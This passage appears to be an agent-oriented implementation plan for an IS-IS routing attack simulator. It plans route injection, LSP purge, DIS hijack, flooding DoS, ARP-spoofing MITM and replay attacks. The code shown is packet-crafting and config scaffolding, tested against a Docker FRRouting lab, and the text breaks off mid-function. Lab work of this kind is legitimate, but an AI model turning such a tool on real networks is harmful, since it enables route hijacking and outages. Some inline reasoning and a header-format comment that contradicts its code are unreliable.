# ISIS Protocol Attack Simulator — Implementation Plan

> **For agentic workers:** Use `superpowers:subagent-driven-development` or `superpowers:executing-plans` to implement task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a complete ISIS protocol attack simulator mirroring OSPF_Protocol_Attack architecture, with 13 attack types across 4 categories.

**Architecture:** Python package + Click CLI + Tkinter GUI, using Scapy for ISIS packet construction at L2 (Ethernet+LLC). Core engine handles IIH/LSP/CSNP/PSNP construction, authentication via TLV, and the 4-phase attack lifecycle. All ISIS data is TLV-encoded. Transport is L2: Ethernet → LLC (DSAP/SSAP=0xFEFE) → ISIS PDU with `sendp()`.

**Tech Stack:** Python 3.10+, Scapy (scapy.contrib.isis + manual byte-level TLV), pcap-ct + Npcap, Click, Tkinter, PyInstaller, pytest, Docker FRRouting.

---

## File Structure

```
isis_attack/            (new package)
├── __init__.py
├── __main__.py
├── core/
│   ├── __init__.py
│   ├── auth.py         — ISIS auth TLV (type 10/133): plain, HMAC-MD5
│   ├── packet.py       — PDU builders (IIH/LSP/CSNP/PSNP) + TLV builders
│   ├── neighbor.py     — IS neighbor state machine (Down/Init/Up)
│   ├── sniffer.py      — L2 sniffing for ISIS PDUs (filter: ether proto 0xFEFE)
│   ├── arp_spoof.py    — ARP spoofing (same as OSPF, minor adaptation)
│   └── active_engine.py — Active adjacency engine (sniff→adjacency→LSP inject)
├── attacks/
│   ├── __init__.py
│   ├── base.py         — BaseAttack abstract base (4-phase lifecycle)
│   ├── adjacency/
│   │   ├── __init__.py
│   │   ├── iih_inject.py
│   │   ├── adjacency_break.py
│   │   └── dis_hijack.py
│   ├── lsp/
│   │   ├── __init__.py
│   │   ├── route_inject.py
│   │   ├── max_seq.py
│   │   ├── purge_lsp.py
│   │   ├── fight_back.py
│   │   └── overload_bit.py
│   ├── dos/
│   │   ├── __init__.py
│   │   ├── flood.py
│   │   ├── spf_recalc.py
│   │   └── db_overflow.py
│   └── protocol/
│       ├── __init__.py
│       ├── mitm.py
│       └── replay.py
├── network/
│   ├── __init__.py
│   ├── adapter.py      — NIC abstraction (L2: MAC address, interface)
│   └── sender.py       — PacketSender (Scapy sendp for L2)
├── config/
│   ├── __init__.py
│   ├── config.py       — YAML+CLI 3-layer config merge
│   └── types.py        — 6 dataclasses (AttackConfig, IIHConfig, LSPConfig, DoSConfig, MITMConfig, ReplayConfig)
├── cli/
│   ├── __init__.py
│   ├── main.py         — Click group entry
│   ├── commands.py     — 13 subcommand registry
│   └── formatters.py   — table/json output
├── gui/
│   ├── __init__.py
│   ├── app.py          — Main window (mirrors OSPF gui/)
│   ├── attack_tree.py  — 4 category 13 attack treeview
│   ├── config_form.py  — Dynamic form
│   ├── log_panel.py    — Thread-safe log
│   ├── pcap_tools.py   — Packet sniffer / pcap import
│   ├── runner.py       — Background attack thread
│   └── styles.py       — Colors/fonts/spacing
├── npcap/              — Npcap dependency management (same as OSPF)
└── utils/
    ├── __init__.py
    └── validators.py   — NSAP/SysID validators

pyproject.toml
isis-attack.spec
build.ps1
.gitignore
README.md
tests/
├── __init__.py
├── unit/
│   ├── __init__.py
│   ├── test_config_types.py
│   ├── test_auth.py
│   ├── test_packet.py
│   ├── test_neighbor.py
│   ├── test_attack_base.py
│   ├── test_iih_inject.py
│   ├── test_adjacency_break.py
│   ├── test_dis_hijack.py
│   ├── test_route_inject.py
│   ├── test_max_seq.py
│   ├── test_purge_lsp.py
│   ├── test_fight_back.py
│   ├── test_overload_bit.py
│   ├── test_flood.py
│   ├── test_spf_recalc.py
│   ├── test_db_overflow.py
│   ├── test_mitm.py
│   ├── test_replay.py
│   ├── test_sender.py
│   ├── test_sniffer.py
│   ├── test_validators.py
│   └── test_cli.py
└── integration/
    ├── __init__.py
    ├── conftest.py           — Docker FRR topology setup
    └── test_topology_attacks.py — 50 integration tests
```

---

## ISIS Protocol Constants

```
PDU types: 15=L1_IIH, 16=L2_IIH, 18=L1_LSP, 20=L2_LSP, 24=L1_CSNP, 25=L2_CSNP, 26=L1_PSNP, 27=L2_PSNP
L1 MAC: 01:80:C2:00:00:14 (AllL1ISs)
L2 MAC: 01:80:C2:00:00:15 (AllL2ISs)
LLC: DSAP=0xFE, SSAP=0xFE, ctrl=0x03
TLV types: 1=Area_Addresses, 6=IS_Neighbors, 10=Auth_ISIS, 128=IP_Internal_Reach, 129=Protocols_Supported, 130=IP_External_Reach, 132=IP_Interface_Addr, 133=Auth_ISIS_Crypto, 137=Hostname
MAX_SEQ=0xFFFFFFFF (ISIS uses 32-bit unsigned)
```

---

## Phase 1: Project Scaffolding

### Task 1: Project skeleton

**Files:**
- Create: `pyproject.toml`
- Create: `isis-attack.spec`
- Create: `build.ps1`
- Create: `.gitignore`
- Create: `isis_attack/__init__.py`
- Create: `isis_attack/__main__.py`
- Create: `isis_attack/core/__init__.py`
- Create: `isis_attack/attacks/__init__.py`
- Create: `isis_attack/attacks/adjacency/__init__.py`
- Create: `isis_attack/attacks/lsp/__init__.py`
- Create: `isis_attack/attacks/dos/__init__.py`
- Create: `isis_attack/attacks/protocol/__init__.py`
- Create: `isis_attack/network/__init__.py`
- Create: `isis_attack/config/__init__.py`
- Create: `isis_attack/cli/__init__.py`
- Create: `isis_attack/utils/__init__.py`

- [ ] **Step 1: Create pyproject.toml**

```toml
[build-system]
requires = ["setuptools>=68.0"]
build-backend = "setuptools.build_meta:__legacy__"

[project]
name = "isis-attack"
version = "0.1.0"
description = "ISIS Protocol Attack Simulator"
requires-python = ">=3.10"
dependencies = [
    "scapy>=2.5.0",
    "click>=8.1.0",
    "pyyaml>=6.0",
    "pcap-ct>=1.1.0",
]
license = {text = "MIT"}

[project.optional-dependencies]
dev = [
    "pytest>=8.0",
    "pytest-mock>=3.12",
]

[project.scripts]
isis-attack = "isis_attack.cli.main:cli"

[tool.setuptools.packages.find]
include = ["isis_attack*"]
```

- [ ] **Step 2: Create isis-attack.spec**

```python
# -*- mode: python ; coding: utf-8 -*-

a = Analysis(
    ['isis_attack\\cli\\main.py'],
    pathex=[],
    binaries=[('assets/npcap-installer.exe', '.')],
    datas=[],
    hiddenimports=['scapy.contrib.isis', 'scapy.layers.l2', 'scapy.layers.inet', 'pcap', 'click', 'yaml'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='isis-attack',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=True,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
```

- [ ] **Step 3: Create build.ps1**

```powershell
$ErrorActionPreference = "Stop"

if (-not (Test-Path "assets/npcap-installer.exe")) {
    Write-Error "assets/npcap-installer.exe not found. Download Npcap first."
    exit 1
}

Write-Host "Building isis-attack.exe..."
pyinstaller --clean --noconfirm isis-attack.spec
Write-Host "Done: dist/isis-attack.exe"
```

- [ ] **Step 4: Create .gitignore**

```
__pycache__/
*.pyc
*.pyo
.pytest_cache/
build/
dist/
*.egg-info/
*.spec.bak
.venv/
venv/
```

- [ ] **Step 5: Create all __init__.py files (empty)**

```python
"""ISIS Protocol Attack Simulator."""
__version__ = "0.1.0"
```
(in `isis_attack/__init__.py`)

All sub-package `__init__.py` files are empty (`"""adjacency attacks."""` etc.)

- [ ] **Step 6: Create isis_attack/__main__.py**

```python
"""ISIS 攻击模拟器 GUI 入口 — python -m isis_attack 启动操作面板。"""
import warnings
warnings.filterwarnings("ignore", message=".*No route found.*")

from isis_attack.gui import launch_gui

if __name__ == "__main__":
    launch_gui()
```

- [ ] **Step 7: Verify package is installable**

Run: `pip install -e "D:\cc\ISIS_Protocol_Attack[dev]"`
Expected: Success

- [ ] **Step 8: Commit**

```bash
git add -A
git commit -m "chore: project scaffolding"
```

---

## Phase 2: Config Layer

### Task 2: Config types (types.py)

**Files:**
- Create: `isis_attack/config/types.py`
- Create: `isis_attack/config/config.py`
- Test: `tests/unit/test_config_types.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/unit/test_config_types.py
import pytest
from isis_attack.config.types import (
    AttackMode, SniffMode, AttackCategory,
    AttackResult, AttackConfig, IIHConfig, LSPConfig,
    DoSConfig, MITMConfig, ReplayConfig,
)

def test_attack_mode_enum():
    assert AttackMode.PASSIVE.value == "passive"
    assert AttackMode.ACTIVE.value == "active"

def test_sniff_mode_enum():
    assert SniffMode.HUB.value == "hub"
    assert SniffMode.ARP_SPOOF.value == "arp_spoof"

def test_attack_category_enum():
    assert AttackCategory.ADJACENCY.value == "adjacency"
    assert AttackCategory.LSP.value == "lsp"
    assert AttackCategory.DOS.value == "dos"
    assert AttackCategory.PROTOCOL.value == "protocol"

def test_attack_result():
    r = AttackResult(success=True, packets_sent=10, target_affected=True, details="ok")
    assert r.success
    assert r.packets_sent == 10
    assert r.target_affected
    assert r.details == "ok"
    assert r.evidence == {}

def test_attack_config_defaults():
    c = AttackConfig(iface="eth0", target="01:80:C2:00:00:14")
    assert c.mode == AttackMode.PASSIVE
    assert c.sniff_mode == SniffMode.HUB
    assert c.sys_id == "1921.6800.1001"
    assert c.area_addr == "49.0001"
    assert c.level == 1
    assert c.sniff_duration == 30

def test_iih_config():
    c = IIHConfig(iface="eth0", target="01:80:C2:00:00:14")
    assert c.hello_interval == 10
    assert c.hold_timer == 30
    assert c.priority == 64

def test_lsp_config():
    c = LSPConfig(iface="eth0", target="01:80:C2:00:00:14")
    assert c.lsp_id == ""
    assert c.sequence == 0x00000001
    assert c.remaining_lifetime == 1200
    assert c.overload_bit is False

def test_dos_config():
    c = DoSConfig(iface="eth0", target="01:80:C2:00:00:14")
    assert c.duration == 60
    assert c.thread_count == 1

def test_mitm_config():
    c = MITMConfig(iface="eth0", target="01:80:C2:00:00:14")
    assert c.action == "modify"
    assert c.modify_rules == []

def test_replay_config():
    c = ReplayConfig(iface="eth0", target="01:80:C2:00:00:14")
    assert c.replay_loop is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/unit/test_config_types.py -v`
Expected: FAIL (ImportError)

- [ ] **Step 3: Write isis_attack/config/types.py**

```python
from dataclasses import dataclass, field
from enum import Enum


class AttackMode(Enum):
    PASSIVE = "passive"
    ACTIVE = "active"


class SniffMode(Enum):
    HUB = "hub"
    ARP_SPOOF = "arp_spoof"


class AttackCategory(Enum):
    ADJACENCY = "adjacency"
    LSP = "lsp"
    DOS = "dos"
    PROTOCOL = "protocol"


@dataclass
class AttackResult:
    success: bool
    packets_sent: int
    target_affected: bool
    details: str
    evidence: dict = field(default_factory=dict)


@dataclass
class AttackConfig:
    """所有攻击类型共享的基础配置"""
    iface: str
    target: str
    mode: AttackMode = AttackMode.PASSIVE
    sniff_mode: SniffMode = SniffMode.HUB
    sys_id: str = "1921.6800.1001"
    area_addr: str = "49.0001"
    level: int = 1

    sniff_duration: int = 30

    arp_target_a: str = ""
    arp_target_b: str = ""
    arp_interval: int = 2

    packet_rate: int = 10
    max_packets: int = 0

    verbose: bool = False


@dataclass
class IIHConfig(AttackConfig):
    """IIH 注入 / 邻接破坏 / DIS 操纵 专用配置"""
    hello_interval: int = 10
    hold_timer: int = 30
    priority: int = 64
    auth_type: str = "none"
    auth_key: str = ""
    circ_id: int = 0


@dataclass
class LSPConfig(AttackConfig):
    """LSP 攻击专用配置"""
    lsp_id: str = ""
    sequence: int = 0x00000001
    remaining_lifetime: int = 1200
    overload_bit: bool = False
    metric: int = 10
    network_addr: str = "10.0.0.0"
    network_mask: str = "255.255.255.0"
    auth_type: str = "none"
    auth_key: str = ""


@dataclass
class DoSConfig(AttackConfig):
    """拒绝服务攻击专用配置"""
    duration: int = 60
    thread_count: int = 1
    lsp_change_interval: int = 2
    lsp_count: int = 1000


@dataclass
class MITMConfig(AttackConfig):
    """中间人攻击专用配置"""
    target_a: str = ""
    target_b: str = ""
    action: str = "modify"
    modify_rules: list = field(default_factory=list)


@dataclass
class ReplayConfig(AttackConfig):
    """重放攻击专用配置"""
    capture_file: str = ""
    replay_loop: bool = False
    replay_interval: int = 0
    modify_fields: list = field(default_factory=list)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/unit/test_config_types.py -v`
Expected: 10 PASS

- [ ] **Step 5: Write isis_attack/config/config.py**

```python
"""配置加载器：实现默认值 → YAML → CLI 三层优先级合并。"""
import os
from .types import (
    AttackConfig, IIHConfig, LSPConfig, DoSConfig, MITMConfig, ReplayConfig,
    AttackMode, SniffMode,
)

_CONFIG_CLASS_MAP = {
    "iih-inject":       IIHConfig,
    "adjacency-break":  IIHConfig,
    "dis-hijack":       IIHConfig,
    "route-inject":     LSPConfig,
    "max-seq":          LSPConfig,
    "purge-lsp":        LSPConfig,
    "fight-back":       LSPConfig,
    "overload-bit":     LSPConfig,
    "flood":            DoSConfig,
    "spf-recalc":       DoSConfig,
    "db-overflow":      DoSConfig,
    "mitm":             MITMConfig,
    "replay":           ReplayConfig,
}


def load_yaml_config(path: str) -> dict:
    import yaml
    with open(path, "r", encoding="utf-8") as f:
        data = yaml.safe_load(f)
    if not isinstance(data, dict):
        raise ValueError(f"YAML 文件内容必须是字典，实际: {type(data)}")
    return data


def merge_config(yaml_data: dict, cli_kwargs: dict) -> dict:
    merged = dict(yaml_data)
    for key, value in cli_kwargs.items():
        if value is not None and value != "" and value != []:
            merged[key] = value
    return merged


def build_config(attack_name: str, cli_kwargs: dict, config_path: str = "") -> AttackConfig:
    config_cls = _CONFIG_CLASS_MAP[attack_name]

    yaml_data = {}
    if config_path and os.path.exists(config_path):
        yaml_data = load_yaml_config(config_path)

    merged = merge_config(yaml_data, cli_kwargs)

    mode = AttackMode.PASSIVE
    if merged.get("mode") == "active":
        mode = AttackMode.ACTIVE

    sniff_mode = SniffMode.HUB
    if merged.get("sniff_mode") == "arp_spoof":
        sniff_mode = SniffMode.ARP_SPOOF

    field_names = set(config_cls.__dataclass_fields__.keys())
    filtered = {k: v for k, v in merged.items() if k in field_names}

    return config_cls(
        iface=merged.get("iface", "eth0"),
        target=merged.get("target", "01:80:C2:00:00:14"),
        mode=mode,
        sniff_mode=sniff_mode,
        **{k: v for k, v in filtered.items() if k not in ("iface", "target", "mode", "sniff_mode")},
    )


def get_available_attacks() -> list:
    return sorted(_CONFIG_CLASS_MAP.keys())
```

- [ ] **Step 6: Write config __init__.py**

```python
from .config import build_config, get_available_attacks, load_yaml_config
```

- [ ] **Step 7: Run test again to verify**

Run: `pytest tests/unit/test_config_types.py -v`
Expected: 10 PASS

- [ ] **Step 8: Commit**

```bash
git add isis_attack/config/ tests/unit/test_config_types.py
git commit -m "feat: add config types and config loader"
```

---

## Phase 3: Network Layer

### Task 3: Network adapter (adapter.py)

**Files:**
- Create: `isis_attack/network/adapter.py`

- [ ] **Step 1: Write adapter.py**

```python
"""Network adapter abstraction — L2 focus (MAC + interface name)."""
import uuid


def get_local_mac(iface: str) -> str:
    try:
        import netifaces
        addrs = netifaces.ifaddresses(iface)
        link = addrs.get(netifaces.AF_LINK)
        if link:
            return link[0]["addr"]
    except ImportError:
        pass
    node = uuid.getnode()
    return ":".join(f"{(node >> (i * 8)) & 0xFF:02x}" for i in reversed(range(6)))


def get_local_ip(iface: str) -> str:
    try:
        import netifaces
        addrs = netifaces.ifaddresses(iface)
        inet = addrs.get(netifaces.AF_INET)
        if inet:
            return inet[0]["addr"]
    except ImportError:
        pass
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()
```

- [ ] **Step 2: Commit**

```bash
git add isis_attack/network/adapter.py
git commit -m "feat: add network adapter (L2 MAC/IP)"
```

### Task 4: Packet sender (sender.py)

**Files:**
- Create: `isis_attack/network/sender.py`
- Test: `tests/unit/test_sender.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/unit/test_sender.py
import pytest
from unittest.mock import patch, MagicMock
from isis_attack.network.sender import PacketSender

def test_sender_init():
    s = PacketSender(iface="eth0", packet_rate=10, max_packets=100)
    assert s.iface == "eth0"
    assert s.packet_rate == 10
    assert s.max_packets == 100
    assert s.sent_count == 0

@patch("isis_attack.network.sender.sendp")
def test_send_l2(mock_sendp):
    s = PacketSender(iface="eth0", packet_rate=100)
    ok = s.send_l2("fake_packet")
    assert ok is True
    assert mock_sendp.called
    assert s.sent_count == 1

def test_rate_limit():
    s = PacketSender(iface="eth0", packet_rate=100, max_packets=2)
    assert s._rate_limit() is True
    s._inc_count()
    assert s._rate_limit() is True
    s._inc_count()
    assert s._rate_limit() is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/unit/test_sender.py -v`
Expected: FAIL

- [ ] **Step 3: Write sender.py**

```python
import time
import threading
from scapy.all import sendp


class PacketSender:
    def __init__(self, iface: str, packet_rate: int = 10, max_packets: int = 0):
        self.iface = iface
        self.packet_rate = packet_rate
        self.max_packets = max_packets
        self._sent_count = 0
        self._lock = threading.Lock()
        self._start_time = time.monotonic()
        self._packet_interval = 1.0 / packet_rate if packet_rate > 0 else 0

    def send_l2(self, packet) -> bool:
        if not self._rate_limit():
            return False
        try:
            sendp(packet, iface=self.iface, verbose=False)
            self._inc_count()
            return True
        except Exception:
            return False

    def send_raw(self, data) -> bool:
        if not self._rate_limit():
            return False
        try:
            from scapy.all import Ether
            sendp(Ether(data), iface=self.iface, verbose=False)
            self._inc_count()
            return True
        except Exception:
            return False

    def _rate_limit(self) -> bool:
        if self.max_packets > 0:
            with self._lock:
                if self._sent_count >= self.max_packets:
                    return False
        if self._packet_interval > 0:
            time.sleep(self._packet_interval)
        return True

    def _inc_count(self):
        with self._lock:
            self._sent_count += 1

    @property
    def sent_count(self) -> int:
        return self._sent_count

    @property
    def elapsed(self) -> float:
        return time.monotonic() - self._start_time
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/unit/test_sender.py -v`
Expected: 3 PASS

- [ ] **Step 5: Commit**

```bash
git add isis_attack/network/sender.py tests/unit/test_sender.py
git commit -m "feat: add L2 packet sender"
```

---

## Phase 4: Core Engine — Auth & Packet

### Task 5: ISIS authentication (auth.py)

**Files:**
- Create: `isis_attack/core/auth.py`
- Test: `tests/unit/test_auth.py`

ISIS auth uses TLV type 10 (plain) or 133 (HMAC-MD5 crypto). Plain auth: TLV with password bytes. HMAC-MD5: TLV with Key-ID + HMAC-MD5 digest over the entire PDU.

- [ ] **Step 1: Write the failing test**

```python
# tests/unit/test_auth.py
import pytest
from isis_attack.core.auth import AUTH_NONE, AUTH_PLAIN, AUTH_MD5, build_auth_tlv, AUTH_TLV_PLAIN, AUTH_TLV_CRYPTO

def test_auth_constants():
    assert AUTH_NONE == 0
    assert AUTH_PLAIN == 1
    assert AUTH_MD5 == 2

def test_build_auth_none():
    tlv = build_auth_tlv(AUTH_NONE, b"")
    assert tlv == b""

def test_build_auth_plain():
    tlv = build_auth_tlv(AUTH_PLAIN, b"secret")
    # TLV type 10, length 6, value b"secret"
    assert tlv[0] == AUTH_TLV_PLAIN  # type 10
    assert tlv[1] == 6  # length
    assert tlv[2:] == b"secret"

def test_build_auth_md5():
    tlv = build_auth_tlv(AUTH_MD5, b"mykey", pdu_bytes=b"\x83\x14\x01" + b"\x00" * 20)
    # TLV type 133, length 17 (1B key_id + 16B HMAC)
    assert tlv[0] == AUTH_TLV_CRYPTO  # type 133
    assert tlv[1] == 17  # 1 + 16
    assert tlv[2] == 1  # key_id
    assert len(tlv) == 19  # type(1) + len(1) + key_id(1) + hmac(16)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/unit/test_auth.py -v`
Expected: FAIL

- [ ] **Step 3: Write auth.py**

```python
"""ISIS authentication (TLV type 10/133).

Supports: none, plain (TLV 10), HMAC-MD5 (TLV 133).
"""
import hashlib
import hmac
import struct

AUTH_NONE = 0
AUTH_PLAIN = 1
AUTH_MD5 = 2

AUTH_TLV_PLAIN = 10
AUTH_TLV_CRYPTO = 133


def build_auth_tlv(auth_type: int, auth_key: bytes,
                   pdu_bytes: bytes = b"", crypto_seq: int = 0) -> bytes:
    """Build an ISIS authentication TLV.

    Args:
        auth_type: 0 (none), 1 (plain TLV 10), 2 (HMAC-MD5 TLV 133)
        auth_key: Key/password bytes
        pdu_bytes: Full ISIS PDU bytes (needed for HMAC-MD5 to zero out TLV)
        crypto_seq: Cryptographic sequence number (HMAC-MD5 only)

    Returns:
        TLV bytes (type + length + value) or empty bytes for none
    """
    if auth_type == AUTH_NONE:
        return b""

    if auth_type == AUTH_PLAIN:
        return struct.pack("!BB", AUTH_TLV_PLAIN, len(auth_key)) + auth_key

    if auth_type == AUTH_MD5:
        # Build the TLV skeleton with key_id
        tlv = struct.pack("!BBB", AUTH_TLV_CRYPTO, 17, 1)
        # Insert at the end of the PDU
        data = pdu_bytes + tlv + b"\x00" * 16
        digest = hmac.HMAC(auth_key, data, hashlib.md5).digest()
        return tlv + digest

    raise ValueError(f"Unsupported auth_type: {auth_type}")


def auth_type_name(t: int) -> str:
    return {AUTH_NONE: "none", AUTH_PLAIN: "plain", AUTH_MD5: "md5"}.get(t, f"unknown({t})")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/unit/test_auth.py -v`
Expected: 4 PASS

- [ ] **Step 5: Commit**

```bash
git add isis_attack/core/auth.py tests/unit/test_auth.py
git commit -m "feat: add ISIS authentication TLV module"
```

### Task 6: ISIS packet construction (packet.py)

**Files:**
- Create: `isis_attack/core/packet.py`
- Test: `tests/unit/test_packet.py`

The packet module is the most critical ISIS-specific code. It builds complete ISIS PDUs (IIH, LSP, CSNP, PSNP) with TLV bodies.

ISIS PDU header (8 bytes):
```
u8  intradomain_routing_protocol = 0x83
u8  header_length
u8  version = 1
u8  id_length (= 0 for 6-byte System ID, or 0 for standard behavior via length)
u8  pdu_type (15=L1_IIH, 16=L2_IIH, 18=L1_LSP, 20=L2_LSP, etc.)
u8  version2 = 1
u8  reserved = 0
u8  max_area_addresses (= 0 means 3)
```

Wait, actually the ISIS PDU header is more nuanced. Let me use Scapy's ISIS classes where possible and only do manual byte construction where Scapy doesn't support something.

Actually, based on OSPF project's pattern (packet.py uses Scapy heavily), let me do the same for ISIS. Scapy's `scapy.contrib.isis` provides:
- `ISIS` base layer
- `ISIS_Hello`
- `ISIS_LSP`
- `ISIS_CSNP`
- `ISIS_PSNP`
- `ISIS_GenericTlv` and `ISIS_Tlv_*` for specific TLVs

But the Scapy ISIS support may be incomplete for LSP bodies. Let me use a hybrid approach: Scapy for headers, manual bytes for TLV construction where needed.

- [ ] **Step 1: Write the failing test**

```python
# tests/unit/test_packet.py
import pytest
from isis_attack.core.packet import (
    ISIS_TYPE_L1_IIH, ISIS_TYPE_L2_IIH, ISIS_TYPE_L1_LSP, ISIS_TYPE_L2_LSP,
    ISIS_MAC_L1, ISIS_MAC_L2,
    build_iih_packet, build_lsp_packet, build_ip_reachability_tlv,
    build_isis_hdr, parse_isis_packet,
    TLV_AREA_ADDR, TLV_IP_INT_REACH, TLV_IP_EXT_REACH, TLV_PROTOCOLS,
)

def test_constants():
    assert ISIS_TYPE_L1_IIH == 15
    assert ISIS_TYPE_L2_IIH == 16
    assert ISIS_TYPE_L1_LSP == 18
    assert ISIS_TYPE_L2_LSP == 20

def test_mac_addresses():
    assert ISIS_MAC_L1 == "01:80:C2:00:00:14"
    assert ISIS_MAC_L2 == "01:80:C2:00:00:15"

def test_build_iih_l1():
    pkt = build_iih_packet(
        sys_id="1921.6800.1001",
        area_addr="49.0001",
        src_mac="00:11:22:33:44:55",
        level=1,
        priority=64,
        hold_timer=30,
    )
    assert pkt is not None
    # Verify it's a Scapy packet with Ether/LLC/ISIS layers
    from scapy.layers.l2 import Ether, LLC
    assert pkt.haslayer(Ether)
    assert pkt.dst == ISIS_MAC_L1
    assert pkt.haslayer(LLC)

def test_build_lsp_packet():
    pkt = build_lsp_packet(
        sys_id="1921.6800.1001",
        lsp_id="1921.6800.1001.00-00",
        src_mac="00:11:22:33:44:55",
        level=1,
        sequence=0x00000001,
        remaining_lifetime=1200,
        tlvs=b"",
    )
    assert pkt is not None
    assert pkt.dst == ISIS_MAC_L1

def test_build_ip_reachability_tlv():
    tlv = build_ip_reachability_tlv(
        internal=True,
        network_addr="10.0.0.0",
        network_mask="255.255.255.0",
        metric=10,
    )
    assert tlv[0] == TLV_IP_INT_REACH
    # length: 12 bytes (4B metric + 4B addr + 4B mask = 12) per reach entry
    assert len(tlv) == 14  # type(1) + len(1) + 12 entry

def test_build_isis_hdr():
    hdr = build_isis_hdr(pdu_type=ISIS_TYPE_L1_IIH, sys_id="1921.6800.1001")
    assert hdr[0] == 0x83  # intradomain routing protocol discriminator
    assert hdr[1] >= 8     # header length
    assert hdr[4] == ISIS_TYPE_L1_IIH

def test_parse_isis_packet():
    pkt = build_iih_packet(sys_id="1921.6800.1001", area_addr="49.0001",
                           src_mac="00:11:22:33:44:55", level=1)
    parsed = parse_isis_packet(bytes(pkt))
    assert parsed is not None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/unit/test_packet.py -v`
Expected: FAIL

- [ ] **Step 3: Write packet.py**

```python
"""ISIS PDU construction and parsing (TLV-encoded, L2 transport)."""
import struct
from scapy.all import Ether
from scapy.layers.l2 import LLC
from scapy.contrib.isis import ISIS, ISIS_Hello, ISIS_LSP, ISIS_CSNP, ISIS_PSNP

from .auth import AUTH_NONE, AUTH_PLAIN, AUTH_MD5, build_auth_tlv

# PDU types
ISIS_TYPE_L1_IIH = 15
ISIS_TYPE_L2_IIH = 16
ISIS_TYPE_P2P_IIH = 17
ISIS_TYPE_L1_LSP = 18
ISIS_TYPE_L2_LSP = 20
ISIS_TYPE_L1_CSNP = 24
ISIS_TYPE_L2_CSNP = 25
ISIS_TYPE_L1_PSNP = 26
ISIS_TYPE_L2_PSNP = 27

ISIS_TYPE_NAMES = {
    15: "L1 IIH", 16: "L2 IIH", 17: "P2P IIH",
    18: "L1 LSP", 20: "L2 LSP",
    24: "L1 CSNP", 25: "L2 CSNP",
    26: "L1 PSNP", 27: "L2 PSNP",
}

# MAC addresses
ISIS_MAC_L1 = "01:80:C2:00:00:14"
ISIS_MAC_L2 = "01:80:C2:00:00:15"

# TLV types
TLV_AREA_ADDR = 1
TLV_IS_NEIGHBORS = 6
TLV_AUTH = 10
TLV_IP_INT_REACH = 128
TLV_PROTOCOLS = 129
TLV_IP_EXT_REACH = 130
TLV_IP_IFACE_ADDR = 132
TLV_AUTH_CRYPTO = 133
TLV_HOSTNAME = 137


def _sys_id_bytes(sys_id: str) -> bytes:
    """Convert '1921.6800.1001' to 6 bytes."""
    parts = sys_id.replace(".", "")
    if len(parts) != 12:
        raise ValueError(f"Invalid System ID: {sys_id}")
    return bytes.fromhex(parts)


def _mac_bytes(mac: str) -> bytes:
    """Convert '00:11:22:33:44:55' to 6 bytes."""
    return bytes(int(b, 16) for b in mac.split(":"))


def _build_level_mac(level: int) -> str:
    return ISIS_MAC_L1 if level == 1 else ISIS_MAC_L2


def _build_llc() -> LLC:
    return LLC(dsap=0xFE, ssap=0xFE, ctrl=3)


def build_isis_hdr(pdu_type: int, sys_id: str = "0000.0000.0000",
                   max_area: int = 3) -> bytes:
    """Build ISIS common header (8+ bytes, variable due to System ID).

    Format:
      u8  proto_discriminator = 0x83
      u8  header_length
      u8  version = 1
      u8  system_id_length (0 = up to 255, or 6 for standard)
      u8  pdu_type
      u8  version2 = 1
      u8  reserved = 0
      u8  max_area_addresses (0 = max 3)
      optional: source_id (id_length bytes)
    """
    sid = _sys_id_bytes(sys_id) if sys_id != "0000.0000.0000" else b"\x00" * 6
    id_len = len(sid)
    hdr_len = 8 + id_len
    hdr = struct.pack("!BBBBBBBB", 0x83, hdr_len, 1, id_len, pdu_type, 1, 0, max_area)
    hdr += sid
    return hdr


def _build_area_tlv(area_addr: str) -> bytes:
    """Build Area Addresses TLV (type 1)."""
    addr_parts = area_addr.replace(".", "")
    addr = bytes.fromhex(addr_parts) if len(addr_parts) % 2 == 0 else bytes.fromhex(addr_parts + "0")
    addr_len = len(addr)
    # value: 1B addr_len + addr bytes
    return struct.pack("!BB", TLV_AREA_ADDR, 1 + addr_len) + bytes([addr_len]) + addr


def _build_protocols_tlv() -> bytes:
    """Build Protocols Supported TLV (type 129) for IPv4 (NLPID 0xCC)."""
    return bytes([TLV_PROTOCOLS, 1, 0xCC])


def _build_ip_iface_tlv(ip_addr: str) -> bytes:
    """Build IP Interface Address TLV (type 132)."""
    parts = [int(x) for x in ip_addr.split(".")]
    return bytes([TLV_IP_IFACE_ADDR, 4]) + bytes(parts)


def build_ip_reachability_tlv(
    internal: bool = True,
    network_addr: str = "10.0.0.0",
    network_mask: str = "255.255.255.0",
    metric: int = 10,
    external_metric: int = 0,
) -> bytes:
    """Build an IP Reachability TLV (type 128 internal, 130 external).

    Each reach entry:
      u32 default_metric (bit 8 = up/down, bits 7|6 = internal/external, bits 5-0 = metric)
      u8  delay_metric (S=1 means supported, bits 6-0 = value, or 0x80 for default)
      u8  expense_metric (S=1 means supported)
      u8  error_metric (S=1 means supported)
      u32 IP address (4 bytes)
      u32 IP subnet mask (4 bytes)
      (optional) external_metric prefix

    Simplified: default metric + 3x0x00 (unsupported metrics) + IP + mask.
    """
    ip_parts = [int(x) for x in network_addr.split(".")]
    mask_parts = [int(x) for x in network_mask.split(".")]

    # default metric: bit 8 = 0 (internal), bits 7-6 = 00 (internal), bits 5-0 = metric
    default_metric = metric & 0x3F
    if internal:
        default_metric |= 0x00  # internal
    else:
